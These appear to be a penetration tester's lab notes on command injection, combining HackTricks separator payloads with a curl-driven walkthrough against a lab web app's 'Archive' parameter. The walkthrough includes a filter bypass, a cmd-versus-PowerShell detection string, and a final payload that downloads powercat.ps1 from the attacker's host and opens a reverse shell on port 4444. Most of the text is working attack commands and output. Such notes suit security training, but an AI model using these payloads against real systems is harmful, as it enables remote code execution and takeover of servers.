
[Command Injection - HackTricks](https://book.hacktricks.xyz/pentesting-web/command-injection)


### START SMALL FIRST

#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
ls %0A id # %0A Execute both (RECOMMENDED)

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful

#Not executed but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
move from there.

### USING CURL TO SEND CMD INJECTIONS

You can see us trying to submit a git clone repository
![[Pasted image 20230929103823.png]]
use burp to see the archive request **Note: see how it uses URL encoding on it**
After seeing the Archive parameter, use curl to provide cmds to the parameter
![[Pasted image 20230929103922.png]]

It detects a cmd injection
┌──(hollacosta㉿kali1)-[~]
└─$ curl -X POST --data 'Archive=ipconfig' http://192.168.231.189:8000/archive
Command Injection detected. Aborting...%!(EXTRA string=ipconfig)      

IT IS ACCEPTING GIT
──(hollacosta㉿kali1)-[~]
└─$ curl -X POST --data 'Archive=**git**' http://192.168.231.189:8000/archive
An error occured with execution: exit status 1 and usage: git [--version] [--help] [-C ] [-c <name>=<value>]
           [--exec-path[=<path>]] [--html-path] [--man-path] [--info-path]
           [-p | --paginate | -P | --no-pager] [--no-replace-objects] [--bare]
           [--git-dir=<path>] [--work-tree=<path>] [--namespace=<name>]
           [--super-prefix=<path>] [--config-env=<name>=<envvar>]
           <command> [<args>]

┌──(hollacosta㉿kali1)-[~]
└─$ curl -X POST --data 'Archive=git **version**' http://192.168.231.189:8000/archive
Repository successfully cloned with command: git version and output: git version 2.36.1.windows.1

**USE %3B AS A DELIMITER FOR MULTIPLE COMMANDS**
┌──(hollacosta㉿kali1)-[~]
└─$ curl -X POST --data 'Archive=git**%3Bi**pconfig' http://192.168.231.189:8000/archive

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.231.189
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.231.254

This cmd is used to get  identify whether is a cmd oor powershell
```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

^1cb993


After URL encode it will look like this:             LEAVE THE PARENTHESIS ON IT!
┌──(hollacosta㉿kali1)-[~]
└─$ curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.231.189:8000/archive
Repository successfully cloned with command: git;(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell and output: usage: git [--version] [--help] [-C <path>] [-c <name>=<value>]
           [--exec-path[=<path>]] [--html-path] [--man-path] [--info-path]
           [-p | --paginate | -P | --no-pager] [--no-replace-objects] [--bare]
           [--git-dir=<path>] [--work-tree=<path>] [--namespace=<name>]
           [--super-prefix=<path>] [--config-env=<name>=<envvar>]
           <command> [<args>]

In this instance, it shows that is a powershell
See 'git help git' for an overview of the system.
PowerShell


### INSTALL POWERCAT (POWERSHELL+NETCAT FOR KALI)

sudo apt install powercat

┌──(hollacosta㉿kali1)-[/usr/share/powershell-empire]
└─$ locate powercat                     FIND LOCATION OF .ps1 FILE
/usr/share/powershell-empire/data/module_source/management/powercat.ps1
/usr/share/powershell-empire/lib/modules/powershell/management/powercat.py
/usr/share/powershell-empire/lib/modules/powershell/management/__pycache__/powercat.cpython-39.pyc
sr/share/powershell-empire]
└─$ cp /usr/share/powershell-empire/data/module_source/management/powercat.ps1 /home/hollacosta 


**Command to download PowerCat and execute a reverse shell**
```
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
```
Downloading Powercat and creating a reverse shell via Command Injection
string is your ifconfig ip address

┌──(hollacosta㉿kali1)-[~]
└─$ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.45.181%2Fpowercat.ps1%22)%3Bpowercat%20-c%20**192.168.119.3**%20-p%204444%20-e%20powershell' http://192.168.231.189:8000/archive



